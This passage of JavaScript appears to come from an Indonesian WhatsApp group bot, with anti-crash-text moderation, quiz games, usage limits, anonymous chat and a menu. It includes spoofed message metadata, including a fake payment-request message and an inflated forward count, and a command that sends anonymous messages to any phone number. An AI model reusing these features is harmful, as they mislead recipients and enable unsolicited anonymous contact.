  ehz.sendText(m.chat, `*TANDAI TELAH DIBACA*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Bang yg ngirim virtex nih:* \nwa.me/${sender.split("@")[0]}`)   
if (!isBotGroupAdmins) {return }
if(isOwner) {return}
await ehz.groupParticipantsUpdate(from, [sender], 'remove')
ehz.sendMessage(from, { delete: m.key })
await ehz.sendMessage(`${nomerOwner}@s.whatsapp.net`,{text: `Hai Owner! wa.me/${sender.split("@")[0]} Terdeteksi Telah Mengirim Virtex ${isGroup?`di Group ${groupName}`:''}`})
 }
 }

//AREA FUNCTION NYA
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ?  ehz.sendMessage(from, { text: teks, mentions: memberr, contextInfo: { "mentionedJid": memberr }}):  ehz.sendMessage(from, {mentions: memberr,text: teks, contextInfo: { "mentionedJid": memberr }},{quoted: m})
}
//Jika ada yg cek bot akan merespon   
if (budy.startsWith('Bot') || budy.startsWith('bot')){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
m.reply(`${global.botName} Aktif Kak`)
}
 /* ~~~~~~~~~ RESPON USER AFK ~~~~~~~~~ */
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    setReply(`Jangan tag, dia sedang afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./src/data/user/afk-user.json', JSON.stringify(_afk))
                ehz.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari afk`, m)
            }
        }


// Jangan Di Edit Tar Error
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await ehz.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await ehz.getName(i + '@s.whatsapp.net')}\n
FN:${await ehz.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:dyccoders@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://dyproject.my.id
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
//MAKE Sticker
async function makeSticker(media,Sticker, StickerTypes){
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: pushname, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await ehz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: 'dy_net', mediaType: 3,  renderLargerThumbnail : true,thumbnailUrl: vid.url,sourceUrl: `${sgc}`																												
}}, sticker: nah }, { quoted: fkontak })   				
await fs.unlinkSync(stok)
}	

//Download Mp3
const downloadMp3 = async (Link ) => {
try{
await ytdl.getInfo(Link);
let mp3File = getRandom('.mp3') 
ytdl(Link, {filter: 'audioonly'})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {  
await ehz.sendMessage(from, { audio:  fs.readFileSync(mp3File), mimetype: 'audio/mp4' },{ quoted: m })
fs.unlinkSync(mp3File)
})       
} catch (err){
console.log(color(err))
}
}
const onlyLimit = async() => {
let yameteh = `Maaf kak @${sender.split('@')[0]} limit kamu sudah habis!`
ehz.sendMessage(from, {text: yameteh},{quoted: m})
}

const onlyGlimit = async() => {
let kyahh = `Maaf kak @${sender.split('@')[0]} limit game kamu sudah habis!`
ehz.sendMessage(from, {text: kyahh},{quoted: m})
}
const onlyOwner = async() => {
setReply(`Ngapain Kak??, Fitur ini khusus Owner Ku Tau mmm!`)
}
const onlyGroup = async() => {
let teks = `┈ ⋞ 〈 P R I V A T E - C H A T 〉 ⋟ ┈

Halo, 👋 @${sender.split('@')[0]}
MOHON MAAF BELUM ADA FITUR YANG DI BUKA UNTUK PRIVATE CHAT SILAHKAN KETIK SEWABOT UNTUK MENDAPATKAN AKSES FITUR BOT LEBIH BANYAK

Akses Lebih Hanya Di Group
`+readmore+`

𝗡𝗢𝗧𝗘 :
SPAM BAKAL DI BLOCK OLEH OWNER`
ehz.sendMessage(from, {text: teks},{quoted: fkontak})
}
//FUNCTION TOTAL FITUR 
const totalFitur = () =>{
            var mytext = fs.readFileSync("./dy.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }

  //FITUR USER PREMIUM
if(!checkDataName("premium", "", DataId)) { 
await createDataId("premium", DataId) 
}
let userPremium =  DataId.filter(item => item.name == "premium" )
for(let i of userPremium[0].id){
if(command == i && !isPremium) return setReply(`Kamu bukan user premium`)
}

//FITUR KHUSUS OWNER
if(!checkDataName("commands", "", DataId)) { 
await createDataId("commands", DataId) 

}
let ownerCommands =  DataId.filter(item => item.name == "commands" )
for(let i of ownerCommands[0].id){
if(command == i && !isOwner) return onlyOwner()
} 

//FITUR USER LIMIT
if(!checkDataName("limit", "", DataId)) { 
await createDataId("limit", DataId) 
}
let userLimit =  DataId.filter(item => item.name == "limit" )
for(let i of userLimit[0].id){
if(!isOwner && command == i ){
if(!isPremium && db.data.users[sender].limit < 1) return m.reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if(!isPremium) {
db.data.users[sender].limit -= 1
ehz.sendMessage(from,{text:`Limit kamu tersisa ${db.data.users[sender].limit}`}, {quoted: fkontak})
}
  
}
}




// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return ehz.updateBlockStatus(m.sender, 'block')
// ====== GAME FEATURE ========//
//GAME Caklontong Function
ehz.caklontong = ehz.caklontong ? ehz.caklontong : {}  
if(isGroup && from in ehz.caklontong){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(ehz.caklontong[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 global.db.data.users[m.sender].exp += ehz.caklontong[id][2]
// global.db.data.users[m.sender].tiketcoin += 1
 setReply(`*Benar!*\n+${ehz.caklontong[id][2]} XP\n+1500 Money\n${json.deskripsi}`)
 clearTimeout(ehz.caklontong[id][3])
 delete ehz.caklontong[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi><*`)
// else setReply(`*Salah!*`)
 
}
  //GAME tebak gambar
ehz.tebakgambar = ehz.tebakgambar ? ehz.tebakgambar : {}  
if(isGroup && from in ehz.tebakgambar){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(ehz.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += ehz.tebakgambar[id][2]
 var teks = `*GAME TEBAK GAMBAR*\n\nJawaban Kamu Benar!\n Hadiah : +${ehz.tebakgambar[id][2]} Money 💸`
   m.reply (teks)
 clearTimeout(ehz.tebakgambar[id][3])
 delete ehz.tebakgambar[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
}

  
//Game Family 100
ehz.family = ehz.family ? ehz.family : {}
if(isGroup && from in ehz.family){
if(!isGroup) {return} 
let similarity = require('similarity')
let threshold = 0.72 // semakin tinggi nilai, semakin mirip
let id =  m.chat
let room = ehz.family[id]
let text = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy)
if (!isSurrender) {
let index = room.jawaban.indexOf(text)
  
if (index < 0) {
if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, text))) >= threshold) return setReply('Dikit lagi!')
 }
if (!isCmd && room.terjawab[index]) {return} 
user.balance += room.winScore
room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length

let caption = `*GAME FAMILY100*

*Soal:* ${room.soal}

Terdapat ${room.jawaban.length} jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB ✅*` : isSurrender ? '*MENYERAH ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
 return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0]  : ''}`.trim() : false
 }).filter(v => v).join('\n')}

${isSurrender ? '' : `+${room.winScore} Money tiap jawaban benar`}
     `.trim()
  
ehz.sendMessage(from, {text: `${caption}`, mentions: [room.terjawab + '@s.whatsapp.net']}, {quoted:fkontak}).then(msg => {
 ehz.family[id].msg = msg
}).catch(_ => _)
if (isWin || isSurrender) delete ehz.family[id] 
//if (isWin || isSurrender) clearTimeout(200000)
}
//GAME tebak lirik Function
ehz.tebaklirik = ehz.tebaklirik ? ehz.tebaklirik : {}  
if(isGroup && from in ehz.tebaklirik){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let json = JSON.parse(JSON.stringify(ehz.tebaklirik[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += ehz.tebaklirik[id][2]
 global.db.data.users[m.sender].exp += 10
   var teks = `*GAME TEBAK LIRIK*\n\nJawaban Kamu Benar!\n Hadiah : +${ehz.tebaklirik[id][2]} Money 💸\n EXP: +10`
   m.reply (teks)
 clearTimeout(ehz.tebaklirik[id][3])
 delete ehz.tebaklirik[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 }
  //GAME tebak kimia Function
ehz.tebakkimia = ehz.tebakkimia ? ehz.tebakkimia : {}  
if(isGroup && from in ehz.tebakkimia){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(ehz.tebakkimia[id][1]))
 let isSurender = /^((me)?nyerah|surr?ender)$/i.test(budy)

 if (budy.toLowerCase() == json.lambang.toLowerCase().trim()) {
user.balance += ehz.tebakkimia[id][2]
 global.db.data.users[m.sender].exp += 10
   var teks = `*GAME TEBAK KIMIA*\n\nJawaban Kamu Benar!\n Hadiah : +${ehz.tebakkimia[id][2]} Money 💸`
   m.reply (teks)
 clearTimeout(ehz.tebakkimia[id][3])
 delete ehz.tebakkimia[id]
 } else if(similarity(budy.toLowerCase(), json.lambang.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi ><*`)
// else setReply(`*Salah!*`)
 }
//GAME MATH FUNCTION
ehz.math = ehz.math ? ehz.math : {}
if(isGroup && from in ehz.math){
if(!isGroup) {return} 
//console.log(ehz.math)
try{
let id = from
if (!(id in ehz.math) && /^apa hasil dari/i.test(budy)) return setReply('soal itu sudah berakhir')
let math = JSON.parse(JSON.stringify(ehz.math[id][1]))
if (budy == math.result) {
user.balance += math.bonus
clearTimeout(ehz.math[id][3])
delete ehz.math[id]
await setReply(` benar\n\nSaldo: Rp${math.bonus}\n\nmath ${math.mode}`)
} else { 
 
}
}catch(err){
console.log(err)
}
}
//GAME  teka teki Function
ehz.tekateki = ehz.tekateki ? ehz.tekateki : {}  
if(isGroup && from in ehz.tekateki){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(ehz.tekateki[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += ehz.tekateki[id][2]
 var teks = `*GAME TEKATEKI*\n\nJawaban Kamu Benar!\n Hadiah : +${ehz.tekateki[id][2]} Money 💸`
 setReply(teks)
 clearTimeout(ehz.tekateki[id][3])
 delete ehz.tekateki[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
}
 //GAME Susunkata Function
ehz.susunkata = ehz.susunkata ? ehz.susunkata : {}  
if(isGroup && from in ehz.susunkata){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(ehz.susunkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += ehz.susunkata[id][2]
   var teks = `*GAME SUSUN KATA*\n\nJawaban Kamu Benar!\n Hadiah : +${ehz.susunkata[id][2]} Money 💸`
m.reply(teks)
 clearTimeout(ehz.susunkata[id][3])
 delete ehz.susunkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 
}
//GAME tebak kata Function
ehz.tebakkata = ehz.tebakkata ? ehz.tebakkata : {}  
if(isGroup && from in ehz.tebakkata){
const similarity = require('similarity')
const threshold = 0.72
let id = from

 let json = JSON.parse(JSON.stringify(ehz.tebakkata[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += ehz.tebakkata[id][2]
setReply(`*TEBAK KATA*

Jawaban Kamu Benar!
Bonus Saldo : +${ehz.tebakkata[id][2]}
Exp : +999`)  
 clearTimeout(conn.tebakkata[id][3])
 delete ehz.tebakkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
 
}
//GAME siapa aku Function
ehz.siapaaku = ehz.siapaaku ? ehz.siapaaku : {}  
if(isGroup && from in ehz.siapaaku){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(ehz.siapaaku[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += ehz.siapaaku[id][2]
var teks = `*GAME SIAPAKAH AKU*\n\nJawaban Kamu Benar!\n Hadiah : +${ehz.siapaaku[id][2]} Money 💸`
   m.reply (teks)
 clearTimeout(ehz.siapaaku[id][3])
 delete ehz.siapaaku[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`) 
}

        //Game Suit PvP
	    ehz.suit = ehz.suit ? ehz.suit : {}
	    let roof = Object.values(ehz.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(budy) && isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(budy)) {
	    ehz.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, dev)
	    delete ehz.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    ehz.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) ehz.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) ehz.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) ehz.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    ehz.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete ehz.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = sender == roof.p
	    let jwb2 = sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(budy) && !roof.pilih && !isGroup) {
	    roof.pilih = reg.exec(budy.toLowerCase())[0]
	    roof.text = budy
	    setReply(`Kamu telah memilih ${budy} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) ehz.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(budy) && !roof.pilih2 && !isGroup) {
	    roof.pilih2 = reg.exec(budy.toLowerCase())[0]
	    roof.text2 = budy
	    setReply(`Kamu telah memilih ${budy} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) ehz.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    ehz.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete ehz.suit[roof.id]
	    }
	    }
//ANONYMOUS CHAT
let secreto = JSON.parse(fs.readFileSync('./database/secreto_balas.json'))
const anonChat = db.data.anonymous
const roomChat = Object.values(anonChat).find(room => [room.a, room.b].includes(m.sender) && room.state == 'CHATTING')
const roomA = Object.values(anonChat).find(room => room.a == m.sender)
const roomB = Object.values(anonChat).find(room => room.b == m.sender )
const room = Object.values(anonChat).find(room => room.state == 'WAITING' && room.b == "")

if (roomChat && !isCmd && !isGroup && roomChat.b !=="") {
//let nono = m.quoted.fakeObj? m.quoted.fakeObj : m
let other = [roomChat.a, roomChat.b].find(user => user !== m.sender)
m.copyNForward(other, true)
}

if (room && Date.now() >= room.expired){

await ehz.sendMessage(room.a, {text:"Partner tidak di temukan\nKamu telah keluar dari room anonymous"})
anonChat.splice(anonChat.indexOf(room, 1)) 
}
    // Secreto
              if(!isGroup){
                if (!m.key.fromMe && secreto.find(i => i.sender === sender)) {
                   var dbx = secreto.find(i => i.sender === sender)
                   if (dbx.status === 'ENTER-MESSAGE') {
                     if (['conversation', 'extendedTextMessage'].includes(m.type)) {
                       var teks_balasan = `Hai kak, kamu menerima pesan balasan nih\n\nPesan Balasannya:\n${budy}\n\n\n_ingat pesan ini satu kali kirim saja yaa_`
                       ehz.sendMessage(dbx.pengirim, { text: teks_balasan })
                       m.reply(`Sukses mengirimkan balasan, ingat pesan ini satu kali kirim saja yaa`)
                     } else {
                       var teks_balasan = `Hai kak, kamu menerima pesan balasan nih\n\nPesan Balasannya :\n${budy}\n\n\n_ingat pesan ini satu kali kirim saja yaa_`
                       var pes = await ehz.sendMessage(dbx.pengirim, { text: teks_balasan })
                       ehz.sendMessage(dbx.pengirim, { forward: m }, { quoted: pes })
                       m.reply(`Sukses mengirimkan balasan, ingat pesan ini satu kali kirim saja yaa`)
                     }
                     var pos = secreto.indexOf(dbx)
                     secreto.splice(pos, 1)
                     fs.writeFileSync('./database/secreto_balas.json', JSON.stringify(secreto, null, 2))
                   }
                }
              }
switch (command) {
case 'confes':
                case 'menfess': case 'menfes': {
                  if (!isPremium) return setReply('*khusus Premium*')
                   if (isGroup) return setReply('Khsus Private Chat Bot')
                   if (!isPremium && global.db.data.users[sender].glimit < 5) return setReply('Limit game sudah habis, silahkan ketik .limit') 
                   if (args.length < 1) return setReply (`*Cara penggunaan :*\n${prefix+command} nomer|nama pengirim|pesannya\n\n*Note :* nomer harus format internasional dan nama pengirim boleh nama samaran atau rahasia\n\n*Contoh :* ${prefix+command} ${botNumber.split("@")[0]}|Seseorang|Hai Kak`)
                   var no = q.split('|')[0];
				 					 if (isNaN(no)) return setReply (`Tujuan Harus Berupa Nomor!\n\nContoh :\n${command} `+botNumber.split("@")[0]+'|Anonim|Hai Kak')
				           var num = no.replace(/[^0-9]/g, ""); 
                   var nama = q.split('|')[1]; 
                   var pesan = q.split('|')[2];
                    if (!num) return setReply (`Format salah, contoh pemakaian : ${prefix+command} ${botNumber.split("@")[0]}|Anonim|Hai Kak`)
                   if (!nama) return setReply (`Format salah, contoh pemakaian : ${prefix+command} ${botNumber.split("@")[0]}|Anonim|Hai Kak`)
                   if (!pesan) return setReply (`Format salah, contoh pemakaian : ${prefix+command} ${botNumber.split("@")[0]}|Anonim|Hai Kak`)
                  var num = num.replace(/[^0-9]/gi, '')+'@s.whatsapp.net'
                   var cek = await ehz.onWhatsApp(num)
                   if (cek.length === 0) return setReply (`Nomer yang anda masukkan tidak terdaftar di WhatsApp!`)
                   var num = cek[0].jid
                   if (sender === num) return setReply (`Jangan kirim ke diri sendiri dong🥲`)
                   if (botNumber === num) return setReply (`Jangan kirim ke nomer bot kak🥲`)
                   var teks = `Hi Saya *${botName}* Ada Yang Kirim Pesan Rahasia Untuk Kamu Nih 🥳

🌷 Nama Pengirim: *${nama}*

💌 Pesan : ${pesan}


*NOTE*:
_Ketik .balas dan geser ke kanan pesan ini untuk menjawab pesan seseorang tersebut_
`                
                   
                   if(isImage || isQuotedImage){
										const media = await ehz.downloadAndSaveMediaMessage(quoted)
                   const anu = await TelegraPh(media) 
                   ehz.sendMessage(num, {caption: teks, image: {url: anu}, mentions: [sender]})
									  await sleep(2000)
									 ehz.sendMessage(num, {image: {url: 'https://telegra.ph/file/b089dfb307251ad5e5559.jpg'}, caption: 'Contoh cara membalas pesan rahasia'})
                   } else if(isVideo || isQuotedVideo){
									 const media = await ehz.downloadAndSaveMediaMessage(quoted)
                   const anu = await TelegraPh(media) 
                   ehz.sendMessage(num, {caption: teks, video: {url: anu}, mentions: [sender]})
										await sleep(2000)
									 ehz.sendMessage(num, {image: {url: 'https://telegra.ph/file/0ca9c64720e7728535491.jpg'}, caption: 'Contoh cara membalas pesan rahasia'})
                   } else {
                   ehz.sendMessage(num, {text: teks, mentions: [sender]})
										await sleep(2000)
									 ehz.sendMessage(num, {image: {url: 'https://telegra.ph/file/15b96750f11c403727c6e.jpg'}, caption: 'Contoh cara membalas pesan rahasia'})      
                   }
                     m.reply(`Sukses mengirim pesan Rahasia kepada ${num.split("@")[0]}`)
                   }
                   break
                   case 'balaspesan':
case 'balasmenfess':
case 'startmenfes': {
  if (!isPremium) return setReply('*khusus Premium*')
if (isGroup) return setReply('Khusus Chat Bot!')
if(!q) return setReply("Masukan nomer yang mau di chat")
if (roomA || roomB == "CHATTING" ) return reply(`Kamu masih berada di dalam chat, ketik *${prefix}stop* untuk keluar dari chatmu`)
let id = + new Date
const obj = {
id,
a: m.sender,
b: Input,
state: "CHATTING",
expired: "INFINITY"
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room chat sekarang kamu bisa mengirim pesan, kirim perintah ${prefix}stop untuk keluar chat`)
ehz.sendText(`${Input}`, `Nomer yang kamu kirim telah menerima pesan kamu\nSekarang kamu bisa mengirim pesan, Ketik .stop untuk keluar`)
}
break
case 'balas':{
                    if(isGroup) return
                    if(!m.quoted.text.includes('Hi Saya')) return m.reply('Balas/Reply pesan bot yang isi menfes di atas')
                    var isSecreto = secreto.find(i => i.sender === sender)
                    if (isSecreto) {
                     if (isSecreto.status === 'ENTER-MESSAGE') {
                       m.reply(`Mau dibalas apa kak? Silahkan kirim pesan balasannya`)
                     }
                   } else {
                     var obj = {
                       sender: sender,
                       pengirim: m.quoted.mentionedJid[0],
                       status: 'ENTER-MESSAGE'
                     }
                     //console.log(obj)
                     secreto.push(obj)
                     fs.writeFileSync('./database/secreto_balas.json', JSON.stringify(secreto))
                     m.reply(`Mau dibalas apa kak? Silahkan kirim pesan balasannya`)
                   }
                   }
                   break   

case 'cr': case 'credits': case 'tqto': case 'thanksto': {
  if (!m.text.includes('.')) return;
let me = m.sender

let tqto = `─┉┈◈ * BIG THANKS TO *◈┈┉

【 Sript By dy_coders 】
╭── ⋅ ⋅ ── ✩ ── ⋅ ⋅ ──╮
» Allah SWT 
» Orang Tua
» dy_coders
╰── ⋅ ⋅ ── ✩ ── ⋅ ⋅ ──╯
〖 Dan yang ikut perkembangan script ini 〗`
ehz.sendMessage(from, { 
text: tqto,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Main Tqto`,
"body": `Date : ${week}, ${calender}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnailUrl": "https://telegra.ph/file/8b71af37d07670a5f2228.jpg",
"sourceUrl": `${sig}`
}
}
},{ 
quoted: fkontak })
await sleep(1500)
ehz.sendMessage(m.chat,{
audio: muahh,mimetype:'audio/mp4', ptt:true })
      }
      break
      

// Baca isi dari premium.json


           
case 'allmenu':{
   if (!m.text.includes('.')) return;
      ehz.relayMessage(m.chat,  {
    requestPaymentMessage: {
      currencyCodeIso4217: 'INR',
      amount1000: 99999,
      requestFrom: m.sender,
      noteMessage: {
      extendedTextMessage: {
      text: 
      `⩽⩾ *${botName}*
⩽⩾ ${week}, ${calender} 
❍┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈◙
│⩽⩾ *Nama* : ${pushname}
│⩽⩾ *Status* : ${isPremium ? 'Premium':'Free'}
│⩽⩾ *Limit* : ${isPremium ? 'Unlimited' : `${global.db.data.users[sender].limit}`}
│⩽⩾ *Limit game* : ${isPremium ? 'Unlimited' : `${global.db.data.users[sender].glimit}`}
 「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」
❍┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈◙
│⩽⩾ *Nama Bot* : ${botName}
│⩽⩾ *Running* : vps pribadi
│⩽⩾ *Total Error* : ${db.data.listerror.length} 
│⩽⩾ *User Banned* : ${db.data.banned.length}
│⩽⩾ *Cmd Blocked* : ${db.data.blockcmd.length} 
❍┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈◙
❍┈┈「 *MENU GROUP* 」
╎╭୧⍤⃝───────────┈◦•◦❥•◦
╎│•⟢.setnamegc
╎│•⟢.setdesc
╎│•⟢.setppgc 
╎│•⟢.infogc
╎│•⟢.getppgc
╎│•⟢.cekmember
╎│•⟢.closegroup
╎│•⟢.opengroup
╎│•⟢.hidetag
╎│•⟢.tagall
╎│•⟢.promote
╎│•⟢.demote
╎│•⟢.kick
╎│•⟢.add
╎│•⟢.resetlinkgc
╎│•⟢.linkgc
╎│•⟢.ban
╎│•⟢.unban
╎│•⟢.listgc
╎│•⟢.afk
╎│•⟢.delete
╎│•⟢.profil
╎│•⟢.intro
╎│•⟢.topbalance
_________________________________

❍┈┈「 *MENU DOWNLOAD* 」
╎╭୧⍤⃝───────────┈◦•◦❥•◦
╎│•⟢.play
╎│•⟢.playmp4
╎│•⟢.ytmp3
╎│•⟢.instagram
╎│•⟢.ttpoto
╎│•⟢.tiktok
╎│•⟢.ttaudio
╎│•⟢.song
╎│•⟢.ssweb
_________________________________

❍┈┈「 *MENU TOOLS* 」
╎╭୧⍤⃝───────────┈◦•◦❥•◦
╎│•⟢.translate/tr
╎│•⟢.nobg
╎│•⟢.pinterest
╎│•⟢.gimage/gimage2
╎│•⟢.jarak 
╎│•⟢.get
╎│•⟢.wattpad
╎│•⟢.playstore
_________________________________

❍┈┈「 *MENU STICKER* 」
╎╭୧⍤⃝───────────┈◦•◦❥•◦
╎│•⟢.s
╎│•⟢.smeme
╎│•⟢.swm
╎│•⟢.qc
╎│•⟢.ttp
╎│•⟢.attp
╎│•⟢.mukelu
_________________________________

❍┈┈「 *MENU CONVERT* 」
